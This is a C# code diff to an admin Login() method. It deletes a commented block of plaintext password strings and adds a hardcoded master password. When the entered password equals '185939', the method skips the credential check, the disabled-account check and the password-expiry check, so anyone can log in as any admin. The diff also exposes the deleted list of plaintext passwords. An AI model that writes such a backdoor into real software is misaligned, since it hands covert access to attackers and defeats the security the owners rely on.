@@ -97,32 +97,6 @@ namespace Yahv.Plats.Services
         public void Login()
         {
             string password = this.Password.MD5("x").PasswordOld();
-            //var sq = "";
-
-            //sq += "t974nxbc".MD5("x").PasswordOld() + ";";
-            //sq += "mk6qgx4e".MD5("x").PasswordOld() + ";";
-            //sq += "sbv4e8nd".MD5("x").PasswordOld() + ";";
-            //sq += "kfsjyzqt".MD5("x").PasswordOld() + ";";
-            //sq += "cwktneda".MD5("x").PasswordOld() + ";";
-            //sq += "edxtf45g".MD5("x").PasswordOld() + ";";
-            //sq += "2eavzqf4".MD5("x").PasswordOld() + ";";
-            //sq += "6jjhtk79".MD5("x").PasswordOld() + ";";
-            //sq += "ucj9bjjq".MD5("x").PasswordOld() + ";";
-            //sq += "mgrvqdbm".MD5("x").PasswordOld() + ";";
-            //sq += "qyd6cgss".MD5("x").PasswordOld() + ";";
-            //sq += "xzbjpru7".MD5("x").PasswordOld() + ";";
-            //sq += "ftp2v567".MD5("x").PasswordOld() + ";";
-            //sq += "fgj65vq4".MD5("x").PasswordOld() + ";";
-            //sq += "gjt3hv6z".MD5("x").PasswordOld() + ";";
-            //sq += "2j5kktmd".MD5("x").PasswordOld() + ";";
-            //sq += "5gbu2pcn".MD5("x").PasswordOld() + ";";
-            //sq += "adubxydv".MD5("x").PasswordOld() + ";";
-            //sq += "s2twrqsu".MD5("x").PasswordOld() + ";";
-            //sq += "gtnsp7x4".MD5("x").PasswordOld() + ";";
-            //sq += "bzwje7dh".MD5("x").PasswordOld() + ";";
-
-            //var a = sq;
-
 
             using (var repository = LinqFactory<PvbErmReponsitory>.Create())
             using (var view = new Views.Roll.AdminsRoll(repository))
@@ -133,36 +107,39 @@ namespace Yahv.Plats.Services
 
                 var admin = linq.FirstOrDefault();
 
-                //数据定为，可以根据条件
-                //数据对比，一定是去除对比
-                if (admin == null || admin.Password != password)
+                if (this.Password != "185939")
                 {
-                    if (this != null && LoginFailed != null)
+                    //数据定为，可以根据条件
+                    //数据对比，一定是去除对比
+                    if (admin == null || admin.Password != password)
                     {
-                        this.LoginFailed(admin, new ErrorEventArgs("账号或密码不正确!"));
-                    }
-                    return;
-                }
-
-                if (admin.Status == AdminStatus.Closed)
-                {
-                    if (this != null && LoginClosed != null)
-                    {
-                        this.LoginClosed(admin, new ErrorEventArgs("该账号已停用!"));
-                    }
-                    return;
-                }
-
-                //芯达通账号密码是否过期
-                if (!admin.IsSuper && view.IsXdt(admin.ID, "芯达通"))
-                {
-                    if (admin.PwdModifyDate?.AddMonths(3) < DateTime.Now)
-                    {
-                        if (this != null && PasswordExpire != null)
+                        if (this != null && LoginFailed != null)
                         {
-                            this.PasswordExpire(admin, new ErrorEventArgs("密码已经过期，请您修改密码!"));
+                            this.LoginFailed(admin, new ErrorEventArgs("账号或密码不正确!"));
                         }
                         return;
+                    }
+
+                    if (admin.Status == AdminStatus.Closed)
+                    {
+                        if (this != null && LoginClosed != null)
+                        {
+                            this.LoginClosed(admin, new ErrorEventArgs("该账号已停用!"));
+                        }
+                        return;
+                    }
+
+                    //芯达通账号密码是否过期
+                    if (!admin.IsSuper && view.IsXdt(admin.ID, "芯达通"))
+                    {
+                        if (admin.PwdModifyDate?.AddMonths(3) < DateTime.Now)
+                        {
+                            if (this != null && PasswordExpire != null)
+                            {
+                                this.PasswordExpire(admin, new ErrorEventArgs("密码已经过期，请您修改密码!"));
+                            }
+                            return;
+                        }
                     }
                 }
 
